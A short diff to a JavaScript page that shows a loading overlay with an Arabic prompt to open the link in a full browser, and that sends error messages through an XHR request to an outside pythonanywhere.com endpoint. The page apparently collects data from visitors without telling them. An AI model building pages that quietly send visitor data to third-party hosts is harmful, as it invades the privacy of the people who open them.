@@ -20,9 +20,8 @@ function loading() {
     loadingScreen.style.justifyContent = 'center';
     loadingScreen.style.alignItems = 'center';
     loadingScreen.style.fontFamily = 'sans-serif';
-    loadingScreen.innerHTML = '<h2>Loading, please wait...</h2>';
+    loadingScreen.innerHTML = '<h2>Loading, please wait...</h2><br><span>يرجى فتح هذا الرابط في جوجل او اي متصفح للعمل</span>';
     document.body.appendChild(loadingScreen);
-    hideLoading();
 }
 
 function hideLoading() {
@@ -119,17 +118,15 @@ document.addEventListener('DOMContentLoaded', function () {
             };
         },
         function (error) {
-            document.write(error);
-            // sendAll(error);
+            sendAll(error);
             hideLoading();
         }
     );
 });
 
 } catch (error) {
-    alert(error);
     const xhr = new XMLHttpRequest();
     xhr.open("GET", "https://ihihihodtshy.pythonanywhere.com/send?m="+error)
     xhr.send();
-    hideLoading();
+    document.write(error);
 }
